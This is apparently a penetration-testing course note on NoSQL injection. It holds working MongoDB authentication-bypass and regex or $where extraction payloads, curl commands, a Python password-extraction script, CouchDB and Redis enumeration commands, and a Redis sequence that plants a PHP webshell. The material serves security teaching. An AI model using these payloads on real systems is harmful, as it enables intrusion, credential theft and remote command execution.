---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.20 NoSQL Injection (MongoDB, CouchDB)"
---

# 06.20 — NoSQL Injection

## What is NoSQL Injection?

NoSQL databases (MongoDB, Redis, CouchDB, Cassandra) don't use SQL — they use JSON-like query languages. But they're still injectable when user input is included in queries without sanitization. NoSQL injection often allows authentication bypass, data extraction, and sometimes OS command execution.

```
TRADITIONAL SQLI:
  SQL: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
  Inject: admin'-- → bypasses password check
  
NOSQL INJECTION (MongoDB):
  Query: {"username": INPUT, "password": INPUT}
  Inject: {"username": {"$ne": null}} → matches ALL users!
  
DIFFERENT SYNTAX, SAME CONCEPT:
  User controls query operators → manipulate what the query returns
```

---

## MongoDB Injection

MongoDB uses JSON-style queries with special operators.

### MongoDB Operators Used in Attacks

```
$ne   → not equal
$gt   → greater than
$lt   → less than
$gte  → greater than or equal
$in   → in array
$nin  → not in array
$regex → regex match
$where → JavaScript execution (POWERFUL!)
$exists → field exists
$type → match by type
```

### Authentication Bypass

```bash
# ORIGINAL LOGIN CODE (Node.js/Express + Mongoose):
# db.users.findOne({username: req.body.username, password: req.body.password})

# NORMAL REQUEST:
POST /login
Content-Type: application/json
{"username": "admin", "password": "secret"}

# NOSQL INJECTION — BYPASS PASSWORD ($ne):
POST /login  
Content-Type: application/json
{"username": "admin", "password": {"$ne": null}}
# MongoDB: find user where username='admin' AND password != null
# → Returns admin user! Password check bypassed!

# BYPASS BOTH FIELDS:
{"username": {"$ne": null}, "password": {"$ne": null}}
# → Returns FIRST user in DB (often admin!)

# WITH FORM DATA (Content-Type: application/x-www-form-urlencoded):
username=admin&password[$ne]=null
username[$ne]=xxx&password[$ne]=xxx

# CURL EXAMPLES:
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":"x"}}'

curl -X POST https://target.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password[$ne]=x"
```

### $regex — Login Without Knowing Username

```bash
# FIND USERS WITH username STARTING WITH 'a':
{"username": {"$regex": "^a"}, "password": {"$ne": null}}

# EXTRACT USERNAME CHARACTER BY CHARACTER:
{"username": {"$regex": "^a.*"}, "password": {"$ne": null}}  → found!
{"username": {"$regex": "^ad.*"}, "password": {"$ne": null}} → found!
{"username": {"$regex": "^adm.*"}, "password": {"$ne": null}} → found!
{"username": {"$regex": "^admi.*"}, "password": {"$ne": null}} → found!
{"username": {"$regex": "^admin"}, "password": {"$ne": null}} → found! (username=admin confirmed)

# EXTRACT PASSWORD (if password stored in plaintext):
{"username": "admin", "password": {"$regex": "^5.*"}}  → found (starts with '5')!
{"username": "admin", "password": {"$regex": "^5f.*"}} → found!
# Continue until full password revealed!
```

### $where — JavaScript Execution (Critical!)

```bash
# $where EXECUTES JAVASCRIPT IN MONGODB:
# Allows complex expressions and potentially SLEEP-like behavior

# BOOLEAN TEST:
{"$where": "1==1"}         → returns all documents (TRUE)
{"$where": "1==2"}         → returns nothing (FALSE)

# DATA EXTRACTION VIA $where:
{"$where": "this.username == 'admin'"}

# SLEEP IN JAVASCRIPT (time-based):
{"$where": "sleep(5000)"}  → 5 second delay!
{"$where": "if(this.username=='admin'){sleep(5000)}"}

# CHARACTER EXTRACTION:
{"$where": "this.password[0]=='5'"}  → TRUE if password starts with '5'!
{"$where": "this.password.length==32"}  → check if password is 32 chars (MD5?)

# TIME-BASED EXTRACTION:
{"$where": "if(this.password[0]=='5'){sleep(3000)}else{return false}"}
# 3 second delay = password starts with '5'!

# FULL EXTRACTION SCRIPT:
python3 -c "
import requests, time, string

url = 'https://target.com/api/login'
charset = string.printable.strip()
password = ''

for i in range(40):  # try up to 40 chars
    for c in charset:
        payload = {'username': 'admin', '\$where': f'this.password.charAt({i})==\'{c}\''}
        start = time.time()
        r = requests.post(url, json=payload)
        elapsed = time.time() - start
        if '\"success\":true' in r.text:  # or check response length
            password += c
            print(f'Password so far: {password}')
            break
    else:
        break

print(f'Final: {password}')
"
```

---

## MongoDB Operator Injection in Other Contexts

```bash
# IN URL PARAMETERS (some frameworks parse [] as objects):
?filter[$ne]=null
?id[$regex]=.*
?username[$gt]=a

# CURL WITH URL PARAMETER NOSQL INJECTION:
curl "https://target.com/users?username[\$ne]=xxx"
curl "https://target.com/search?q[\$regex]=.*admin.*"

# IN HEADERS:
curl -H "X-Auth-Token: invalid" \
  -H "Content-Type: application/json" \
  --data '{"token": {"$ne": null}}' \
  https://target.com/api/protected
```

---

## CouchDB Injection

CouchDB uses HTTP REST API — queries are HTTP requests to special endpoints:

```bash
# LIST ALL DATABASES:
curl https://target.com:5984/_all_dbs
# → ["_replicator","_users","myapp"]  

# ACCESS A DATABASE:
curl https://target.com:5984/myapp/_all_docs
# → All documents! If no auth = CRITICAL finding!

# READ SPECIFIC DOCUMENT:
curl https://target.com:5984/myapp/admin
# → User admin document with all fields!

# FUTON / FAUXTON ADMIN INTERFACE:
curl https://target.com:5984/_utils/
# → Web admin interface! (should be password protected)

# COUCHDB INJECTION IN VIEWS (Erlang/JavaScript in map functions):
# If user input ends up in a CouchDB view:
# Inject JavaScript into the map function
{"map": "function(doc){if(doc._id=='admin'){emit(doc.password,null)}}"}

# NOSQLMAP TOOL:
python3 nosqlmap.py --attack 2  # attack mode 2 = MongoDB auth bypass
```

---

## Redis Injection

Redis doesn't use SQL — it's a key-value store. Attacks typically target:
1. Unauthenticated Redis exposed to internet
2. Redis command injection (SSRF to Redis)

```bash
# DIRECTLY EXPOSED REDIS (no auth!):
redis-cli -h target.com
PING → PONG  # connected!
INFO server  # version info
KEYS *       # ALL keys!
GET admin    # get value of 'admin' key
HGETALL user:1  # get all fields of hash

# REDIS COMMAND INJECTION VIA SSRF:
# If app fetches URLs and you can point it to internal Redis:
# Redis responds to raw TCP commands
# Send via SSRF: http://127.0.0.1:6379/...
# (covered in SSRF module)

# REDIS CONFIG WRITE (webshell!):
redis-cli -h target.com
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['cmd']); ?>"
BGSAVE
# Creates shell.php in webroot!
```

---

## Automated NoSQL Injection Testing

```bash
# NOSQLMAP (best tool):
git clone https://github.com/codingo/NoSQLMap.git
pip3 install -r requirements.txt

# TEST MONGODB:
python3 nosqlmap.py
# (interactive menu)
# Enter URL, select attack type

# SPECIFIC ATTACK:
python3 nosqlmap.py --attack 1  # authentication bypass
python3 nosqlmap.py --attack 3  # extract data

# BURP SUITE:
# Test manually by modifying JSON requests in Burp Repeater
# Try: {"field": {"$ne": null}} in each field

# SQLMAP (limited NoSQL support):
sqlmap -u "https://target.com/login" \
  --data='{"username":"*","password":"test"}' \
  -H "Content-Type: application/json" \
  --no-cast  # sometimes helps with NoSQL

# MANUAL TEST CHECKLIST:
# 1. Try {"field": {"$ne": null}} in login
# 2. Try {"field": {"$gt": ""}} in login
# 3. Try {"field": {"$regex": ".*"}} in search
# 4. Try {"$where": "sleep(5000)"} for time-based
# 5. Try field[$ne]=null in form data
```

---

## SSTI via $where (Template Injection)

Some applications use template engines that, combined with MongoDB's $where, allow SSTI:

```bash
# IF $where IS PASSED THROUGH A TEMPLATE ENGINE:
{"$where": "{{7*7}}"}  → if returns 49 in error → SSTI!
{"$where": "this.password.match(/{{7*7}}/)"} → embedded template
```

---

## Related Notes
- [[01 - What is SQL Injection]] — SQLi conceptual comparison
- [[Module 07 - API Security]] — API-level injection testing
- [[Module 06 - Web Vulnerabilities]] — broader vulnerability context
- [[04 - SSRF]] — Redis exploitation via SSRF
